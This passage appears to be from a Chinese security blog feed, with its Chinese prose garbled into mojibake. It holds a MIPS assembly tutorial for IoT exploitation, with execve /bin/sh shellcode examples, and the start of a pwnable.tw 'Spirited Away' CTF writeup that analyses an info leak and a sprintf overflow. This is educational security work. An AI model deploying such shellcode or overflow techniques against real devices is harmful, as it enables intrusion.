<tr>
<td align="left">$31</td>
<td>$ra</td>
<td>å­˜å‚¨å‡½æ•°çš„è¿”å›åœ°å€</td>
<td>Return Address</td>
</tr>
</tbody></table>
<h3 id="ç‰¹æ®Šå¯„å­˜å™¨"><a href="#ç‰¹æ®Šå¯„å­˜å™¨" class="headerlink" title="ç‰¹æ®Šå¯„å­˜å™¨"></a>ç‰¹æ®Šå¯„å­˜å™¨</h3><p>é™¤äº†ä¸Šé¢32ä¸ªé€šç”¨å¯„å­˜å™¨ï¼ŒMIPSæ¶æ„è¿˜å®šä¹‰äº†ä¸€äº›ç‰¹æ®Šç”¨é€”çš„å¯„å­˜å™¨ï¼Œä¸‹é¢ä»‹ç»ä¸€äº›ç‰¹æ®Šå¯„å­˜å™¨ï¼š</p>
<table>
<thead>
<tr>
<th>åç§°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>$pc</td>
<td>ç¨‹åºè®¡æ•°å™¨ï¼ŒæŒ‡å‘å½“å‰æ‰§è¡Œçš„æŒ‡ä»¤åœ°å€</td>
</tr>
<tr>
<td>$hi</td>
<td>é«˜ä½å¯„å­˜å™¨ï¼Œå­˜å‚¨ä¹˜é™¤æ“ä½œçš„é«˜ä½ç»“æœ</td>
</tr>
<tr>
<td>$lo</td>
<td>ä½ä½å¯„å­˜å™¨ï¼Œå­˜å‚¨ä¹˜é™¤æ“ä½œçš„ä½ä½ç»“æœ</td>
</tr>
<tr>
<td>$status</td>
<td>çŠ¶æ€å¯„å­˜å™¨ï¼Œæ§åˆ¶å¤„ç†å™¨æ¨¡å¼å’Œä¸­æ–­çŠ¶æ€</td>
</tr>
<tr>
<td>$cause</td>
<td>åŸå› å¯„å­˜å™¨ï¼Œå­˜å‚¨å¼‚å¸¸å’Œä¸­æ–­çš„åŸå› </td>
</tr>
</tbody></table>
<h2 id="æŒ‡ä»¤"><a href="#æŒ‡ä»¤" class="headerlink" title="æŒ‡ä»¤"></a>æŒ‡ä»¤</h2><p>MIPSæ¶æ„å›ºå®š4å­—èŠ‚æŒ‡ä»¤é•¿åº¦ï¼Œå…¶æ±‡ç¼–æŒ‡ä»¤ä¸x86è¿˜æ˜¯ä¸å¤ªä¸€æ ·çš„ï¼Œä½†åŒºåˆ«ä¹Ÿä¸å¤§ï¼Œä¸‹é¢å°±åªä»‹ç»ä¸€äº›å¸¸è§çš„æ±‡ç¼–æŒ‡ä»¤ã€‚</p>
<h3 id="åŸºç¡€æŒ‡ä»¤"><a href="#åŸºç¡€æŒ‡ä»¤" class="headerlink" title="åŸºç¡€æŒ‡ä»¤"></a>åŸºç¡€æŒ‡ä»¤</h3><table>
<thead>
<tr>
<th align="left">æŒ‡ä»¤</th>
<th align="left">å¤‡æ³¨</th>
<th>æè¿°</th>
<th align="left">ä¸¾ä¾‹åˆ†æ</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>li</code></td>
<td align="left">Load Immediate</td>
<td>å°†ç«‹å³æ•°å­˜å…¥å¯„å­˜å™¨</td>
<td align="left"><code>li $a2,2</code>ï¼Œ$a2çš„å€¼ä¸º2</td>
</tr>
<tr>
<td align="left"><code>lui</code></td>
<td align="left"></td>
<td>å°†ç«‹å³æ•°(ä»¥äºŒè¿›åˆ¶å½¢å¼)å·¦ç§»16ä½åï¼Œå­˜å…¥å¯„å­˜å™¨</td>
<td align="left"><code>lui $t0,0xF</code>ï¼Œ$t0çš„å€¼ä¸º0xF0000</td>
</tr>
<tr>
<td align="left"><code>la</code></td>
<td align="left">Load Address</td>
<td>å°†åœ°å€å­˜å…¥å¯„å­˜å™¨</td>
<td align="left"><code>la $t9,memset</code>ï¼Œ$t9ä¸­ä¸ºmemsetå‡½æ•°çš„åœ°å€</td>
</tr>
<tr>
<td align="left"><code>lw</code></td>
<td align="left">Load Word</td>
<td>ä»å†…å­˜ä¸­åŠ è½½ä¸€ä¸ª<code>word</code>ç±»å‹çš„å€¼åˆ°å¯„å­˜å™¨ä¸­</td>
<td align="left"><code>lw $gp,0x170+var_158($sp)</code>ï¼Œä»æ ˆæŒ‡é’ˆ$spåç§» 0x170+var_158 çš„ä½ç½®ï¼ŒåŠ è½½ä¸€ä¸ª<code>32</code>ä½çš„å€¼åˆ°$gpä¸­</td>
</tr>
<tr>
<td align="left"><code>sw</code></td>
<td align="left">Store Word</td>
<td>å°†ä¸€ä¸ª 32 ä½çš„å€¼ä»å¯„å­˜å™¨å­˜å‚¨åˆ°å†…å­˜ä¸­</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>addi</code></td>
<td align="left">Add Immediate</td>
<td>å°†ç«‹å³æ•°ä¸å¯„å­˜å™¨çš„å€¼ç›¸åŠ åï¼ŒæŠŠç»“æœå†™å…¥å¦ä¸€ä¸ªå¯„å­˜å™¨</td>
<td align="left"><code>addi $t,$s,0xF</code>ï¼Œ$tä¸­ä¸º$sçš„å€¼ä¸0xFçš„å’Œ</td>
</tr>
<tr>
<td align="left"><code>addu</code></td>
<td align="left">Add Unsigned</td>
<td>å°†å¯„å­˜å™¨çš„å€¼ç›¸åŠ (æ— ç¬¦å·åŠ æ³•)åï¼ŒæŠŠç»“æœå†™åˆ°å¯„å­˜å™¨ä¸­</td>
<td align="left"><code>addu $v0,$v1,$v0</code></td>
</tr>
<tr>
<td align="left"><code>add</code></td>
<td align="left"></td>
<td>åŒadduï¼ŒåŒºåˆ«æ˜¯è¯¥æŒ‡ä»¤æ˜¯æœ‰ç¬¦å·åŠ æ³•</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>addiu</code></td>
<td align="left"></td>
<td>åŒaddiï¼ŒåŒºåˆ«æ˜¯è¯¥æŒ‡ä»¤åŠ æ— ç¬¦å·ç«‹å³æ•°</td>
<td align="left"></td>
</tr>
</tbody></table>
<h3 id="è·³è½¬æŒ‡ä»¤"><a href="#è·³è½¬æŒ‡ä»¤" class="headerlink" title="è·³è½¬æŒ‡ä»¤"></a>è·³è½¬æŒ‡ä»¤</h3><table>
<thead>
<tr>
<th>æŒ‡ä»¤</th>
<th>å¤‡æ³¨</th>
<th>æè¿°</th>
<th>ä¸¾ä¾‹åˆ†æ</th>
</tr>
</thead>
<tbody><tr>
<td><code>jr</code></td>
<td>Jump Register</td>
<td>æ— æ¡ä»¶è·³è½¬åˆ°æŸä¸ªå¯„å­˜å™¨æŒ‡å®šçš„åœ°å€</td>
<td></td>
</tr>
<tr>
<td><code>jal</code></td>
<td>Jump and Link</td>
<td>è·³è½¬åˆ°æŸä¸ªåœ°å€ï¼Œå¹¶å°†è¿”å›åœ°å€å­˜å…¥<code>$ra</code>å¯„å­˜å™¨</td>
<td></td>
</tr>
<tr>
<td><code>jalr</code></td>
<td>Jump and Link Register</td>
<td>è·³è½¬åˆ°æŸä¸ªå¯„å­˜å™¨æŒ‡å®šçš„åœ°å€ï¼Œå¹¶å°†è¿”å›åœ°å€å­˜å…¥å¦ä¸€ä¸ªå¯„å­˜å™¨</td>
<td><code>jalr $t9</code>è·³è½¬åˆ°$t9å­˜å‚¨çš„åœ°å€ï¼Œå¹¶å°†è¿”å›åœ°å€å­˜å…¥$ra</td>
</tr>
<tr>
<td><code>b</code></td>
<td>Branch</td>
<td>æ— æ¡ä»¶è·³è½¬æŒ‡ä»¤ï¼ˆæ ‡ç­¾æˆ–åœ°å€ï¼‰</td>
<td></td>
</tr>
<tr>
<td><code>bnez</code></td>
<td>Branch if Not Equal to Zero</td>
<td>æŒ‡å®šå¯„å­˜å™¨çš„å€¼<strong>ä¸ä¸º0</strong>ï¼Œæ‰è·³è½¬</td>
<td><code>bnez $v0,loc_402B24</code>è‹¥$v0çš„å€¼ä¸ºé›¶åˆ™è·³è½¬åˆ°loc_402B24æ ‡ç­¾å¤„</td>
</tr>
<tr>
<td><code>beqz</code></td>
<td>Branch if Equal to Zero</td>
<td>æŒ‡å®šå¯„å­˜å™¨çš„å€¼<strong>ä¸º0</strong>ï¼Œæ‰è·³è½¬</td>
<td></td>
</tr>
</tbody></table>
<h2 id="å‡½æ•°è°ƒç”¨"><a href="#å‡½æ•°è°ƒç”¨" class="headerlink" title="å‡½æ•°è°ƒç”¨"></a>å‡½æ•°è°ƒç”¨</h2><h3 id="å¶å­ä¸éå¶å­å‡½æ•°"><a href="#å¶å­ä¸éå¶å­å‡½æ•°" class="headerlink" title="å¶å­ä¸éå¶å­å‡½æ•°"></a>å¶å­ä¸éå¶å­å‡½æ•°</h3><p>å®šä¹‰ï¼šç°æœ‰3ä¸ªå‡½æ•°åˆ†åˆ«ä¸ºAã€Bã€Cï¼Œå…¶ä¸­å‡½æ•°Aè°ƒç”¨å‡½æ•°Bï¼Œå‡½æ•°Bè°ƒç”¨å‡½æ•°Cï¼Œå› æ­¤Aå’ŒBä¸ºéå¶å­å‡½æ•°ï¼ŒCä¸ºå¶å­å‡½æ•°ã€‚</p>
<p>è°ƒç”¨å‡½æ•°Cæ—¶ä¼šå°†å…¶è¿”å›åœ°å€ç›´æ¥å­˜å…¥<code>$ra</code>å¯„å­˜å™¨ï¼Œæ‰§è¡Œå®Œå‡½æ•°Cåï¼Œç¨‹åºæµä¼šç›´æ¥æ‰§è¡Œ<code>jr $ra</code>æŒ‡ä»¤è·³åˆ°è¿”å›åœ°å€ï¼ˆè¿”å›å‡½æ•°Bï¼‰ï¼›è€Œå¯¹äºå‡½æ•°Bï¼Œåœ¨è·³è½¬åˆ°Bæ—¶ä¼šå°†å…¶è¿”å›åœ°å€å…ˆå­˜å…¥<code>$ra</code>å¯„å­˜å™¨ï¼Œç„¶ååœ¨æ‰§è¡Œå‡½æ•°Bçš„è¿‡ç¨‹ä¸­å†å°†<code>$ra</code>çš„å€¼å­˜å…¥æ ˆä¸­ï¼Œæ‰§è¡Œå®Œåï¼Œç¨‹åºæµåˆ™ä¼šå…ˆä»å †æ ˆä¸­å–å‡ºè¢«ä¿å­˜åœ¨å †æ ˆä¸Šçš„è¿”å›åœ°å€ï¼Œæ”¾å…¥<code>$ra</code>å¯„å­˜å™¨ä¸­ï¼Œç„¶åå†æ‰§è¡Œ<code>jr $ra</code>æŒ‡ä»¤ã€‚</p>
<h3 id="å‡½æ•°ä¼ å‚"><a href="#å‡½æ•°ä¼ å‚" class="headerlink" title="å‡½æ•°ä¼ å‚"></a>å‡½æ•°ä¼ å‚</h3><p>å½“å‚æ•°å°äºç­‰äº4ä¸ªæ—¶ï¼Œä½¿ç”¨<code>$a0 ~ $a3</code>å¯„å­˜å™¨å­˜å‚¨ï¼›è¶…è¿‡4ä¸ªçš„éƒ¨åˆ†è¢«æ”¾åˆ°äº†æ ˆé‡Œã€‚ä¸”å‰4ä¸ªå‚æ•°åœ¨ä½¿ç”¨å‰ä¹Ÿä¼šè¢«æ”¾å…¥ä¹‹å‰åœ¨æ ˆä¸­é¢„ç•™çš„ç©ºé—´ä¸­ã€‚</p>
<h3 id="æ ˆå¸§å¼€è¾Ÿ"><a href="#æ ˆå¸§å¼€è¾Ÿ" class="headerlink" title="æ ˆå¸§å¼€è¾Ÿ"></a>æ ˆå¸§å¼€è¾Ÿ</h3><p>è°ƒç”¨å‡½æ•°æ—¶ï¼ŒMIPSæ¶æ„ä¸‹å¼€è¾Ÿæ ˆå¸§çš„æ–¹å¼ä¸x86æ¶æ„ä¸åŒï¼Œä½†æœ€åçš„æ ˆå¸§ç»“æ„æ˜¯ç›¸åŒçš„ã€‚MIPSä¸‹çš„æ ˆå¸§å¼€è¾Ÿæ–¹å¼å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â–º 0x400614 &lt;main+16&gt;    jal    A &lt;0x4005a4&gt;</span><br><span class="line">   â†“</span><br><span class="line">  0x4005a4 &lt;A&gt;          addiu  $sp, $sp, -0x20   #ï¼ˆ1ï¼‰å¼€è¾Ÿæ ˆå¸§ç©ºé—´</span><br><span class="line">  0x4005a8 &lt;A+4&gt;        sw     $ra, 0x1c($sp)    #ï¼ˆ2ï¼‰å­˜å‚¨è¿”å›åœ°å€ï¼ˆè°ƒç”¨å®Œå‡½æ•°Aåè¿”å›åˆ°çš„åœ°å€</span><br><span class="line">  0x4005ac &lt;A+8&gt;        sw     $fp, 0x18($sp)    #ï¼ˆ3ï¼‰å°†$fpæ”¾å…¥æ ˆä¸­</span><br><span class="line">  0x4005b0 &lt;A+12&gt;       move   $fp, $sp          #ï¼ˆ4ï¼‰å°†$spæ”¾å…¥$fpä¸­</span><br></pre></td></tr></table></figure>

<p>ç­‰ä»·çš„x86æŒ‡ä»¤å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call 	main			#è¿™é‡Œçš„ä½œç”¨åŒä¸Šé¢çš„ï¼ˆ2ï¼‰</span><br><span class="line">push    ebp				#ï¼ˆ3ï¼‰</span><br><span class="line">mov     ebp, esp		#ï¼ˆ4ï¼‰</span><br><span class="line">sub     esp, 14h		#ï¼ˆ1ï¼‰</span><br></pre></td></tr></table></figure>

<h2 id="mipsæ¶æ„ç‰¹æ€§"><a href="#mipsæ¶æ„ç‰¹æ€§" class="headerlink" title="mipsæ¶æ„ç‰¹æ€§"></a>mipsæ¶æ„ç‰¹æ€§</h2><p>MIPSæ¶æ„å­˜åœ¨â€œæµæ°´çº¿æ•ˆåº”â€å’Œâ€œç¼“å­˜ä¸ä¸€è‡´æ€§â€è¿™ä¸¤ä¸ªç‰¹æ€§ã€‚</p>
<p>â€œæµæ°´çº¿æ•ˆåº”â€æŒ‡çš„æ˜¯æœ¬åº”è¯¥é¡ºåºæ‰§è¡Œçš„å‡ æ¡æŒ‡ä»¤ä¼šåŒæ—¶æ‰§è¡Œï¼Œè¿™æ ·åœ¨æ‰§è¡Œè·³è½¬æŒ‡ä»¤çš„æ—¶å€™ï¼Œå½“åˆšè¦è·³è½¬åˆ°æŒ‡å®šåœ°å€æ—¶ï¼Œè·³è½¬æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ä¹Ÿå·²ç»æ‰§è¡Œäº†ï¼Œè¿™æ ·çš„ç°è±¡ç§°ä¸º<strong>åˆ†æ”¯å»¶è¿Ÿæ•ˆåº”</strong>ï¼Œè·³è½¬æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ç§°ä¸º<strong>åˆ†æ”¯å»¶è¿Ÿæ§½</strong>ã€‚ä¹Ÿå› æ­¤ï¼ŒMIPSæ¶æ„ä¸‹çš„åˆ†æ”¯å»¶è¿Ÿæ§½é€šå¸¸éƒ½æ˜¯<code>nop</code>æŒ‡ä»¤ï¼Œå½“ç„¶ä¹Ÿä¸å…¨æ˜¯ã€‚</p>
<p>â€œç¼“å­˜ä¸ä¸€è‡´æ€§â€æŒ‡çš„æ˜¯æŒ‡ä»¤ç¼“å­˜åŒºå’Œæ•°æ®ç¼“å­˜åŒºä¸¤è€…çš„åŒæ­¥éœ€è¦ä¸€ä¸ªæ—¶é—´æ¥åŒæ­¥ï¼Œæ¯”å¦‚æˆ‘ä»¬å°†shellcodeå†™å…¥æ ˆä¸Šåï¼Œæˆ‘ä»¬éœ€è¦è¿™å—åŒºåŸŸå·²ç»æ˜¯æŒ‡ä»¤ç¼“å­˜åŒºï¼Œä½†æ­¤æ—¶å…¶è¿˜å±äºæ•°æ®ç¼“å­˜åŒºï¼Œè‹¥ç›´æ¥è·³è½¬è¿‡å»æ‰§è¡Œshellcodeï¼Œå°±ä¼šå‡ºç°é—®é¢˜ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬<strong>éœ€è¦è°ƒç”¨<code>sleep</code>å‡½æ•°</strong>ï¼Œå…ˆåœé¡¿ä¸€æ®µæ—¶é—´ï¼Œç»™å®ƒæ—¶é—´ä»æ•°æ®ç¼“å­˜åŒºè½¬æˆæŒ‡ä»¤ç¼“å­˜åŒºï¼Œç„¶åå†è·³è½¬è¿‡å»ï¼Œæ‰èƒ½æˆåŠŸæ‰§è¡Œã€‚</p>
<h2 id="shellcodeç¼–å†™"><a href="#shellcodeç¼–å†™" class="headerlink" title="shellcodeç¼–å†™"></a>shellcodeç¼–å†™</h2><p><code>$v0</code>å¯„å­˜å™¨å­˜å‚¨<strong>ç³»ç»Ÿè°ƒç”¨å·</strong>å’Œ<strong>ç³»ç»Ÿè°ƒç”¨çš„è¿”å›å€¼</strong>ï¼Œ<code>$a0 ~ $a3</code>å¯„å­˜å™¨ç”¨æ¥å­˜å‚¨å‰4ä¸ªå‚æ•°ï¼Œ<code>syscall</code>æŒ‡ä»¤è§¦å‘ç³»ç»Ÿè°ƒç”¨ã€‚</p>
<p>å…ˆè¯•ç€è‡ªå·±å†™ä¸€ä¸ªwriteçš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data</span><br><span class="line">some_label: .word 0x61626364</span><br><span class="line">.text</span><br><span class="line">.globl __start</span><br><span class="line">__start:</span><br><span class="line">	.set noreorder</span><br><span class="line">    li $a0,1</span><br><span class="line">    la $a1,some_label</span><br><span class="line">    li $a2,4</span><br><span class="line">    li $v0,4004</span><br><span class="line">    syscall</span><br><span class="line">    li $v0,4001</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ç³»ç»Ÿè°ƒç”¨å®Œwriteåï¼Œè¿˜è¦å†æ‰§è¡Œä¸€ä¸ªexitç³»ç»Ÿè°ƒç”¨ï¼Œä»¥é˜²æ­¢ç¨‹åºçš„æ‰§è¡Œæµç»§ç»­æ‰§è¡Œåé¢çš„æŒ‡ä»¤ï¼Œè€Œå¯¼è‡´å‡ºç°ä¸€ç³»åˆ—é”™è¯¯ã€‚</p>
<h3 id="execveç³»ç»Ÿè°ƒç”¨"><a href="#execveç³»ç»Ÿè°ƒç”¨" class="headerlink" title="execveç³»ç»Ÿè°ƒç”¨"></a>execveç³»ç»Ÿè°ƒç”¨</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data</span><br><span class="line">.text</span><br><span class="line">.globl __start</span><br><span class="line">__start:</span><br><span class="line">	.set noreorder</span><br><span class="line">    addiu $sp,$sp,-0x10</span><br><span class="line">    li $t0,0x2f62696e #/bin</span><br><span class="line">    li $t1,0x2f2f7368 #//sh</span><br><span class="line">    sw $t0,0x8($sp)</span><br><span class="line">    sw $t1,0xc($sp)</span><br><span class="line">    la $a0,0x8($sp)</span><br><span class="line">    addi $a1,$zero,0</span><br><span class="line">    addi $a2,$zero,0</span><br><span class="line">    addi $v0,$zero,4011</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢è¿™æ®µä»£ç éœ€è¦å¼€è¾Ÿæ ˆå¸§ï¼Œå€ŸåŠ©æ ˆæ¥ä¼ é€’å­—ç¬¦ä¸²<code>/bin//sh</code>çš„åœ°å€ç»™<code>$a0</code>å¯„å­˜å™¨ï¼Œä¹Ÿå¯ä»¥é€šè¿‡<code>.byte</code>æŒ‡ä»¤å°†<code>/bin//sh</code>å­—ç¬¦ä¸²æ”¾åœ¨è‡ªå®šä¹‰çš„æ ‡ç­¾ä¸­ï¼ˆæ³¨æ„å­—ç¬¦ä¸²åé¢è¦00æˆªæ–­ï¼Œä¸ç„¶åé¢å¯èƒ½ä¼šå¸¦ä¸Šå…¶ä»–å­—ç¬¦ï¼‰ï¼Œç„¶åç›´æ¥<code>la</code>æ ‡ç­¾çš„åœ°å€ç»™<code>$a0</code>å¯„å­˜å™¨ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data</span><br><span class="line"># /bin//sh\x00</span><br><span class="line">some_label: .byte 0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x00</span><br><span class="line">.text</span><br><span class="line">.globl __start</span><br><span class="line">__start:</span><br><span class="line">	.set noreorder</span><br><span class="line">    la $a0,some_label</span><br><span class="line">    addi $a1,$zero,0</span><br><span class="line">    addi $a2,$zero,0</span><br><span class="line">    addi $v0,$zero,4011</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å€ŸåŠ©è¿™ä¸ªç½‘ç«™<a href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/">Online Assembler and Disassembler</a>ï¼ŒæŸ¥çœ‹æ±‡ç¼–ä»£ç å¯¹åº”çš„æœºå™¨ç ã€‚</p>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://www.yuque.com/cyberangel/rg9gdm/yxb067">ã€ŠIoTä»å…¥é—¨åˆ°å…¥åœŸã€‹(1)â€“MIPSäº¤å‰ç¼–è¯‘ç¯å¢ƒæ­å»ºåŠå…¶32ä½æŒ‡ä»¤é›†</a></p>
<p><a href="https://prowes5.github.io/2019/07/21/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">è·¯ç”±å™¨æ¼æ´åˆ†æç¯å¢ƒæ­å»º | Prowes5â€™s Blog</a></p>
<p><a href="https://zikh26.github.io/posts/919c29c4.html">IOTå®‰å…¨å…¥é—¨å­¦ä¹ â€“MIPSæ±‡ç¼–åŸºç¡€ | ZIKH26â€™s Blog</a></p>
<p>[<a href="https://bbs.kanxue.com/thread-273522.htm#msg_header_h1_4">åŸåˆ›]IDAåŠæ’ä»¶MIPSROPå®‰è£…â€”â€”ã€Šæ­ç§˜å®¶ç”¨è·¯ç”±å™¨0dayæ¼æ´æŒ–æ˜æŠ€æœ¯ã€‹å­¦ä¹ ç¬”è®°-å®‰å…¨å·¥å…·-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p>
<p><a href="https://gdufs-king.github.io/2021/06/08/ida%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85%E8%B8%A9%E5%9D%91%E7%BB%8F%E5%8E%86/">idaæ’ä»¶å®‰è£…è¸©å‘ç»å† - V1ct0rçš„åšå®¢</a></p>
]]></content>
      <categories>
        <category>IOTå®‰å…¨</category>
      </categories>
      <tags>
        <tag>IOTå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw writeup-Spirited Away</title>
    <url>/2024/07/28/Spirited-Away/</url>
    <content><![CDATA[<h2 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h2><span id="more"></span>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">survey</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">56</span>]; <span class="comment">// [esp+10h] [ebp-E8h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [esp+48h] [ebp-B0h]</span></span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// [esp+4Ch] [ebp-ACh]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">80</span>]; <span class="comment">// [esp+50h] [ebp-A8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+A0h] [ebp-58h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [esp+A4h] [ebp-54h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">80</span>]; <span class="comment">// [esp+A8h] [ebp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  nbytes = <span class="number">60</span>;</span><br><span class="line">  v3 = <span class="number">80</span>;</span><br><span class="line">LABEL_2:</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x3C</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nPlease enter your name: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, nbytes);                         <span class="comment">// bufæ˜¯name</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your age: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);                    <span class="comment">// v5æ˜¯age</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Why did you came to see this movie? &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, v7, v3);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your comment: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, nbytes);</span><br><span class="line">  ++cnt;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Age: %d\n&quot;</span>, v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Reason: %s\n&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Comment: %s\n\n&quot;</span>, s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(v1, <span class="string">&quot;%d comment so far. We will review them as soon as we can&quot;</span>, cnt);</span><br><span class="line">  <span class="built_in">puts</span>(v1);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;::s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">if</span> ( cnt &gt; <span class="number">199</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;200 comments is enough!&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;choice, <span class="number">3u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">89</span> || choice == <span class="number">121</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(buf);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">78</span> || choice == <span class="number">110</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong choice.&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="æ•°æ®æ³„æ¼"><a href="#æ•°æ®æ³„æ¼" class="headerlink" title="æ•°æ®æ³„æ¼"></a>æ•°æ®æ³„æ¼</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf);</span><br></pre></td></tr></table></figure>

<p>å°†<em>buf</em>å¡«æ»¡åï¼Œ<em>printf</em>ä¼šæ‰“å°å‡º<em>buf</em>åŠå…¶åé¢çš„æ•°æ®ã€‚</p>
<h4 id="æ ˆæº¢å‡º"><a href="#æ ˆæº¢å‡º" class="headerlink" title="æ ˆæº¢å‡º"></a>æ ˆæº¢å‡º</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(v1, <span class="string">&quot;%d comment so far. We will review them as soon as we can&quot;</span>, cnt);</span><br><span class="line"><span class="comment">//sprintfå…ˆå°†cntçš„å€¼æ¥åˆ°&#x27;%d&#x27;çš„ä½ç½®ä¸Šï¼Œç„¶åå°†æ•´ä¸ªå¥å­å†™åˆ°v1ä¸­</span></span><br></pre></td></tr></table></figure>

<p><em>v1</em>åˆ°<em>nbytes</em>çš„åç§»æ˜¯<code>0xE8-0xB0 = 0x38</code>ï¼Œè€Œ<em>comment so far. We will review them as soon as we can</em>åœ¨å†…å­˜ä¸­ï¼Œå æ®<code>0x36</code>ä¸ªå­—èŠ‚ã€‚å¦‚æœ<code>cnt=100</code>ï¼Œä¾¿å¯ä½¿å­—ç¬¦<code>n</code>æº¢å‡ºåˆ°<em>nbytes</em>çš„åœ°å€ä¸Šã€‚<code>n</code>çš„<em>ascii</em>ç æ˜¯<code>0x6e</code>ï¼Œæ‰€ä»¥<em>nbytes</em>å°±ç­‰äº<code>0x6e</code>äº†ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202250636.png" alt="1"></p>
